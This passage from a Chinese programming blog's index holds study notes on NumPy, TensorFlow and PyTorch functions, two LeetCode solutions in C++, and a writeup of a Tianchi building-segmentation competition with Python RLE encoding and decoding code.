<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>一个多月没学习了，忘了好多，没想起来使用queue容器，好在石头数量不大使用多次sort排序也可以满足题目要求。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>机器学习笔记</title>
    <url>/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h5 id="NumPy"><a href="#NumPy" class="headerlink" title="NumPy"></a>NumPy</h5><p>用法：<code>import numpy as np</code></p>
<p>NumPy(Numerical Python) 是 Python 语言的一个扩展程序库（开源），支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。<br><a id="more"></a></p>
<h6 id="np-c-和np-r-的用法解析"><a href="#np-c-和np-r-的用法解析" class="headerlink" title="np.c_和np.r_的用法解析"></a>np.c_和np.r_的用法解析</h6><p>np.r_是按列连接两个矩阵，就是把两矩阵上下相加，要求列数相等。</p>
<p>np.c_是按行连接两个矩阵，就是把两矩阵左右相加，要求行数相等。</p>
<p><img src="/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310091828457.png" alt="image-20210310091828457"></p>
<h6 id="numpy-dot-函数用法"><a href="#numpy-dot-函数用法" class="headerlink" title="numpy.dot()函数用法"></a>numpy.dot()函数用法</h6><p>dot()返回的是两个数组的点积（dot product）。</p>
<p>dot()函数可以通过numpy库调用，也可以由数组实例对象进行调用。a.dot(b) 与 np.dot(a,b)效果相同.</p>
<p><img src="/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310094707115.png" alt="image-20210310094707115"></p>
<h6 id="np-linalg模块"><a href="#np-linalg模块" class="headerlink" title="np.linalg模块"></a>np.linalg模块</h6><p>numpy.linalg模块包含线性代数的函数。使用这个模块，可以计算逆矩阵、求特征值、解线性方程组以及求解行列式等。</p>
<ol>
<li>np.linalg.inv()：矩阵求逆</li>
<li>np.linalg.det()：矩阵求行列式（标量）</li>
<li>np.linalg.norm() 对向量（或矩阵）求范数</li>
</ol>
<p>np.linalg.norm(x,ord=None,axis=None,keepdims=False)</p>
<p>x表示要度量的向量（矩阵），ord表示范数的种类</p>
<p><img src="/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310100713755.png" alt="image-20210310100713755"></p>
<p><img src="/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310101856728.png" alt="image-20210310101856728"></p>
<h5 id="TensorFlow"><a href="#TensorFlow" class="headerlink" title="TensorFlow"></a>TensorFlow</h5><p>用法：<code>import tensorflow as tf</code></p>
<p>TensorFlow是一个基于数据流编程（dataflow programming）的符号数学系统，被广泛应用于各类机器学习（machine learning）算法的编程实现</p>
<p>安装：<code>pip3 install --user --upgrade tensorflow</code></p>
<h6 id="tf-reduce-sum-函数"><a href="#tf-reduce-sum-函数" class="headerlink" title="tf.reduce_sum()函数"></a>tf.reduce_sum()函数</h6><p>reduce_sum( ) 是求和函数，在 tensorflow 里面，计算的都是 tensor，可以通过调整 axis =0,1 的维度来控制求和维度。</p>
<p><img src="/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310160834632.png" alt="image-20210310160834632"></p>
<h6 id="tf-reduce-mean-函数"><a href="#tf-reduce-mean-函数" class="headerlink" title="tf.reduce_mean()函数"></a>tf.reduce_mean()函数</h6><p>tf.reduce_mean 函数用于计算张量tensor沿着指定的数轴（tensor的某一维度）上的的平均值，主要用作降维或者计算tensor（图像）的平均值。</p>
<p><img src="/2021/03/10/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210310161921270.png" alt="image-20210310161921270"></p>
<h5 id="Pytorch"><a href="#Pytorch" class="headerlink" title="Pytorch"></a>Pytorch</h5><p>安装官网：<a href="https://pytorch.org/">https://pytorch.org/</a></p>
<h6 id="sklearn、pytorch和tensorflow的关系"><a href="#sklearn、pytorch和tensorflow的关系" class="headerlink" title="sklearn、pytorch和tensorflow的关系"></a>sklearn、pytorch和tensorflow的关系</h6><p>这三者的关系，简单来说，sklearn是机器学习的包，pytorch和Tensorflow是深度学习的包</p>
<p><a href="https://blog.csdn.net/youhuakongzhi/article/details/94208335">sklearn和tensorflow的区别</a></p>
<p><a href="https://xcx.topsage.com/9030.html">pytorch和tensorflow的区别</a></p>
]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>线性回归</title>
    <url>/2021/03/10/%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script>]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>线性模型</tag>
      </tags>
  </entry>
  <entry>
    <title>统计匹配检索规则的物品数量</title>
    <url>/2021/03/09/%E7%BB%9F%E8%AE%A1%E5%8C%B9%E9%85%8D%E6%A3%80%E7%B4%A2%E8%A7%84%E5%88%99%E7%9A%84%E7%89%A9%E5%93%81%E6%95%B0%E9%87%8F/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/count-items-matching-a-rule/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>items</code> ，其中 <code>items[i] = [typei, colori, namei]</code> ，描述第 <code>i</code> 件物品的类型、颜色以及名称。</p>
<p>另给你一条由两个字符串 <code>ruleKey</code> 和 <code>ruleValue</code> 表示的检索规则。</p>
<p>如果第 <code>i</code> 件物品能满足下述条件之一，则认为该物品与给定的检索规则 匹配 ：</p>
<ul>
<li><code>ruleKey == &quot;type&quot;</code> 且 <code>ruleValue == typei</code> 。</li>
<li><code>ruleKey == &quot;color&quot;</code> 且 <code>ruleValue == colori</code> 。</li>
<li><code>ruleKey == &quot;name&quot;</code> 且 <code>ruleValue == namei</code> 。</li>
</ul>
<p>统计并返回 匹配检索规则的物品数量 。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：items &#x3D; [[&quot;phone&quot;,&quot;blue&quot;,&quot;pixel&quot;],[&quot;computer&quot;,&quot;silver&quot;,&quot;lenovo&quot;],[&quot;phone&quot;,&quot;gold&quot;,&quot;iphone&quot;]], ruleKey &#x3D; &quot;color&quot;, ruleValue &#x3D; &quot;silver&quot;</span><br><span class="line">输出：1</span><br><span class="line">解释：只有一件物品匹配检索规则，这件物品是 [&quot;computer&quot;,&quot;silver&quot;,&quot;lenovo&quot;] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：items &#x3D; [[&quot;phone&quot;,&quot;blue&quot;,&quot;pixel&quot;],[&quot;computer&quot;,&quot;silver&quot;,&quot;phone&quot;],[&quot;phone&quot;,&quot;gold&quot;,&quot;iphone&quot;]], ruleKey &#x3D; &quot;type&quot;, ruleValue &#x3D; &quot;phone&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：只有两件物品匹配检索规则，这两件物品分别是 [&quot;phone&quot;,&quot;blue&quot;,&quot;pixel&quot;] 和 [&quot;phone&quot;,&quot;gold&quot;,&quot;iphone&quot;] 。注意，[&quot;computer&quot;,&quot;silver&quot;,&quot;phone&quot;] 未匹配检索规则。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><p><code>1 &lt;= items.length &lt;=</code> 10<sup>4</sup></p>
</li>
<li><p><code>1 &lt;= typei.length, colori.length, namei.length, ruleValue.length &lt;= 10</code></p>
</li>
<li><p><code>ruleKey</code> 等于 <code>&quot;type&quot;</code>、<code>&quot;color&quot;</code> 或 <code>&quot;name&quot;</code></p>
</li>
<li><p>所有字符串仅由小写字母组成</p>
</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong>遍历数组items，统计检索结果。</p>
<p><strong>c++代码：</strong>(执行用时76ms，击败94.52%，内存消耗30M，击败95.14%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countMatches</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&gt;&amp; items, <span class="built_in">string</span> ruleKey, <span class="built_in">string</span> ruleValue)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> index=<span class="number">0</span>,result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(ruleKey==<span class="string">&quot;color&quot;</span>)&#123;</span><br><span class="line">            index++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ruleKey==<span class="string">&quot;name&quot;</span>)&#123;</span><br><span class="line">            index+=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> m=items.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(items[i][index]==ruleValue)&#123;</span><br><span class="line">                result++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，简单😃。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>重复的子字符串</title>
    <url>/2021/03/11/%E9%87%8D%E5%A4%8D%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/problems/repeated-substring-pattern/"><strong>题目地址</strong></a></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个非空的字符串，判断它是否可以由它的一个子串重复多次构成。给定的字符串只含有小写英文字母，并且长度不超过10000。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;abab&quot;</span><br><span class="line"></span><br><span class="line">输出: True</span><br><span class="line"></span><br><span class="line">解释: 可由子字符串 &quot;ab&quot; 重复两次构成。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;aba&quot;</span><br><span class="line"></span><br><span class="line">输出: False</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;abcabcabcabc&quot;</span><br><span class="line"></span><br><span class="line">输出: True</span><br><span class="line"></span><br><span class="line">解释: 可由子字符串 &quot;abc&quot; 重复四次构成。 (或者子字符串 &quot;abcabc&quot; 重复两次构成。)</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong>没有想出比较高效的解法，期待官方题解指点迷津了。先找出所有可能满足题意的子串长度，然后用双指针去校验这个子串是否满足题意，注意这个子串长度从大到小进行可以提高效率（36ms-&gt;16ms）。</p>
<p><strong>c++代码：</strong>(执行用时16ms，击败87.89%，内存消耗22.1M，击败10.80%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstringPattern</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> result=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="comment">//遍历查找所有可能的子串长度,子串长度从大到小</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n/<span class="number">2</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(n%i==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">this</span>-&gt;repeatedSubstring(s,i))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//判断长度为len的子串是否满足条件</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">repeatedSubstring</span><span class="params">(<span class="built_in">string</span> s,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=s.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> p=len;p&lt;n;p+=len)&#123; </span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> q=<span class="number">0</span>;q&lt;len;q++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[q]!=s[p+q])&#123;           </span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我使用的是方法一，但是还可以优化，找时间再学KMP算法。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>语义分割-地表建筑物识别</title>
    <url>/2021/03/12/%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2-%E5%9C%B0%E8%A1%A8%E5%BB%BA%E7%AD%91%E7%89%A9%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://tianchi.aliyun.com/competition/entrance/531872/information">天池比赛地址</a></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>文档</th>
<th>格式</th>
</tr>
</thead>
<tbody>
<tr>
<td>SS_Data_A_20210201.md</td>
<td>.md(939B)</td>
</tr>
</tbody>
</table>
</div>
<a id="more"></a>
<h5 id="赛题背景"><a href="#赛题背景" class="headerlink" title="赛题背景"></a>赛题背景</h5><p>赛题以计算机视觉为背景，要求选手使用给定的航拍图像训练模型并完成地表建筑物识别任务。为更好的引导大家入门，我们为本赛题定制了学习方案和学习任务，具体包括语义分割的模型和具体的应用案例。在具体任务中我们将讲解具体工具和使用和完成任务的过程。</p>
<p>通过对本方案的完整学习，可以帮助掌握语义分割基本技能。同时我们也将提供专属的视频直播学习通道。</p>
<h5 id="赛题描述及数据说明"><a href="#赛题描述及数据说明" class="headerlink" title="赛题描述及数据说明"></a>赛题描述及数据说明</h5><p>遥感技术已成为获取地表覆盖信息最为行之有效的手段，遥感技术已经成功应用于地表覆盖检测、植被面积检测和建筑物检测任务。本赛题使用航拍数据，需要参赛选手完成地表建筑物识别，将地表航拍图像素划分为有建筑物和无建筑物两类。</p>
<p>如下图，左边为原始航拍图，右边为对应的建筑物标注。</p>
<p><img src="/2021/03/12/%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2-%E5%9C%B0%E8%A1%A8%E5%BB%BA%E7%AD%91%E7%89%A9%E8%AF%86%E5%88%AB/161218137939445491612181378279.png" alt="enter image description here"></p>
<p>赛题数据来源（Inria Aerial Image Labeling），并进行拆分处理。数据集报名后可见并可下载。赛题数据为航拍图，需要参赛选手识别图片中的地表建筑具体像素位置。</p>
<ul>
<li><code>train_mask.csv</code>：存储图片的标注的rle编码；</li>
<li><code>train</code>和<code>test</code>文件夹：存储训练集和测试集图片；</li>
</ul>
<p>rle编码的具体的读取代码如下(添加了注释)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">NumPy(Numerical Python) 是 Python 语言的一个扩展程序库（开源），支持大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pandas 是基于NumPy 的一种工具，该工具是为解决数据分析任务而创建的。Pandas 纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">CV2指的是OpenCV2，OpenCV是一个基于BSD许可（开源）发行的跨平台计算机视觉库</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将图片编码为rle格式</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rle_encode</span>(<span class="params">im</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    im: numpy array, 1 - mask, 0 - background</span></span><br><span class="line"><span class="string">    Returns run length as string formated</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    pixels = im.flatten(order = <span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">    <span class="comment">#flatten函数：可选order参数，‘C&#x27;(flatten in row-major)，’F‘(flatten in column-major)，’A‘，’K‘,返回flatten后的一维数组</span></span><br><span class="line">    pixels = np.concatenate([[<span class="number">0</span>], pixels, [<span class="number">0</span>]])</span><br><span class="line">   	<span class="comment">#np.concatenate()是用来对数列或矩阵进行合并的，把一维数组首位各加一个0</span></span><br><span class="line">    runs = np.where(pixels[<span class="number">1</span>:] != pixels[:<span class="number">-1</span>])[<span class="number">0</span>] + <span class="number">1</span></span><br><span class="line">    <span class="comment">#np.where():以tuple形式给出满足条件(即非0)的元素的坐标</span></span><br><span class="line">    <span class="comment">#这里runs数组内容为pixels中与前一个数不等的元素的位置</span></span><br><span class="line">    runs[<span class="number">1</span>::<span class="number">2</span>] -= runs[::<span class="number">2</span>]</span><br><span class="line">    <span class="comment">#更改runs中从第一个位置开始间隔为2这些元素的值为与前一个元素值的差</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join(str(x) <span class="keyword">for</span> x <span class="keyword">in</span> runs)</span><br><span class="line">	<span class="comment">#返回用间隔分割的runs数组元素的字符串</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将rle格式进行解码为图片</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rle_decode</span>(<span class="params">mask_rle, shape=(<span class="params"><span class="number">512</span>, <span class="number">512</span></span>)</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mask_rle: run-length as string formated (start length)</span></span><br><span class="line"><span class="string">    shape: (height,width) of array to return </span></span><br><span class="line"><span class="string">    Returns numpy array, 1 - mask, 0 - background</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    s = mask_rle.split()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    str.split(str=&quot;&quot;, num=string.count(str)):通过指定分隔符对字符串进行切片，如果参数 num 有指定值，则分隔 num+1 个子字符串</span></span><br><span class="line"><span class="string">    param参数</span></span><br><span class="line"><span class="string">    str--默认为所有的空字符（空格、换行、制表符等）</span></span><br><span class="line"><span class="string">    num--分割次数，默认为-1，分割所有</span></span><br><span class="line"><span class="string">    return--返回分割后的字符串列表</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">    starts, lengths = [np.asarray(x, dtype=int) <span class="keyword">for</span> x <span class="keyword">in</span> (s[<span class="number">0</span>:][::<span class="number">2</span>], s[<span class="number">1</span>:][::<span class="number">2</span>])]</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    array和asarray都可以将结构数据转化为ndarray，但是主要区别就是当数据源是ndarray时，array仍然会copy出一个副本，占用新的内存，但asarray不会</span></span><br><span class="line"><span class="string">    starts为列表s中偶数位置元素组成的数组，lengths为列表s中奇数位置元素组成的数组</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    starts -= <span class="number">1</span></span><br><span class="line">    ends = starts + lengths</span><br><span class="line">    img = np.zeros(shape[<span class="number">0</span>]*shape[<span class="number">1</span>], dtype=np.uint8)</span><br><span class="line">    <span class="comment">#uint8是专门用于存储各种图像的（包括RGB，灰度图像等），范围是从0–255</span></span><br><span class="line">    <span class="keyword">for</span> lo, hi <span class="keyword">in</span> zip(starts, ends):</span><br><span class="line">        img[lo:hi] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> img.reshape(shape, order=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">	<span class="comment">#reshape():在不改变数据内容的情况下，改变一个数组的格式</span></span><br></pre></td></tr></table></figure>
<p>读取样例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_mask = pd.read_csv(<span class="string">&#x27;train_mask.csv&#x27;</span>, sep=<span class="string">&#x27;\t&#x27;</span>, names=[<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;mask&#x27;</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pandas.read_csv(filepath_or_buffer,sep,header,names)</span></span><br><span class="line"><span class="string">filepath_or_buffer--字符串，文件路径名</span></span><br><span class="line"><span class="string">sep--指定分隔符，默认是逗号</span></span><br><span class="line"><span class="string">header--指定行数作为列名，默认为0，否则设置为None</span></span><br><span class="line"><span class="string">names--用于结果的列名列表</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 读取第一张图，并将对于的rle解码为mask矩阵</span></span><br><span class="line">img = cv2.imread(<span class="string">&#x27;train/&#x27;</span>+ train_mask[<span class="string">&#x27;name&#x27;</span>].iloc[<span class="number">0</span>])</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cv2.imread(filepath,flags)读入一幅图片</span></span><br><span class="line"><span class="string">filepath--图片路径</span></span><br><span class="line"><span class="string">flags--读入图片的形式默认是读取彩色图片</span></span><br><span class="line"><span class="string">iloc提取指定位置的元素，这里是取出name列的第一行数据，即第一张图片的名称</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">mask = rle_decode(train_mask[<span class="string">&#x27;mask&#x27;</span>].iloc[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">print(rle_encode(mask) == train_mask[<span class="string">&#x27;mask&#x27;</span>].iloc[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 结果为True</span></span><br></pre></td></tr></table></figure>
<h5 id="评估标准"><a href="#评估标准" class="headerlink" title="评估标准"></a>评估标准</h5><p>赛题使用Dice coefficient来衡量选手结果与真实标签的差异性，Dice coefficient可以按像素差异性来比较结果的差异性。Dice coefficient的具体计算方式如下：</p>
<script type="math/tex; mode=display">
\frac{2 * |X \cap Y|}{|X| + |Y|}∣*X*∣+∣*Y*∣2∗∣*X*∩*Y*∣</script><p>其中X<em>X</em>是预测结果，Y<em>Y</em>为真实标签的结果。当X<em>X</em>与Y<em>Y</em>完全相同时Dice coefficient为1，排行榜使用所有测试集图片的平均Dice coefficient来衡量，分数值越大越好。</p>
<h5 id="结果提交"><a href="#结果提交" class="headerlink" title="结果提交"></a>结果提交</h5><p>提交前请确保预测结果的格式与<code>test_sample_submit.csv</code>中的格式一致，以及提交文件后缀名为csv。</p>
<p>注意事项：</p>
<ul>
<li>第一列为test图片名称，第二列为rle编码；</li>
<li>如测试集图没有识别出结果，也需要提交空字符串；</li>
<li>测试集图片顺序需要与<code>test_sample_submit.csv</code>保持一致；</li>
</ul>
<h5 id="比赛规则"><a href="#比赛规则" class="headerlink" title="比赛规则"></a>比赛规则</h5><ol>
<li>为了比赛公平公正，所有参赛选手<strong>不允许使用任何外部数据集</strong>（如外部航拍数据）。同时所有参赛选手<strong>不允许使用任何非公开的预训练模型，公开的预训练模型</strong>（如ImageNet和COCO）可以使用。</li>
<li>为了比赛趣味性，不建议选手使用伪标签操作，同时建议选手保存好代码，最终比赛程序代码需要完整复现。</li>
</ol>
<h5 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h5><p>本来以为可以不用训练，直接用图像二值化方法处理就能得到图像二值化数据，测试训练集一张图片出现失误觉得这种方法可行，最后处理完测试集才发现得到的rle编码太长（包含太多的细节）导致测试集结果文件太大238M而题目要求50M以内，故必须建立模型进行训练了🤣，还以为能走捷径呢，哈哈哈。</p>
<p><img src="/2021/03/12/%E8%AF%AD%E4%B9%89%E5%88%86%E5%89%B2-%E5%9C%B0%E8%A1%A8%E5%BB%BA%E7%AD%91%E7%89%A9%E8%AF%86%E5%88%AB/image-20210309215312755.png" alt="image-20210309215312755"></p>
<p>根据题目提示，是要使用DiceLoss损失函数，但问题是怎么构建模型能对图片输出预测值（0-1二值化）呢</p>
<p>，尝试了很久未果，无奈求助网络，找到了有大佬分享的baseline代码，跑模型如下</p>
<p>图片rle解码编码测试</p>
<p><img src="file://F:\课题项目\天池\零基础入门语义分割-地表建筑物识别\notes\image-20210309100134328.png?lastModify=1615538546" alt="image-20210309100134328"></p>
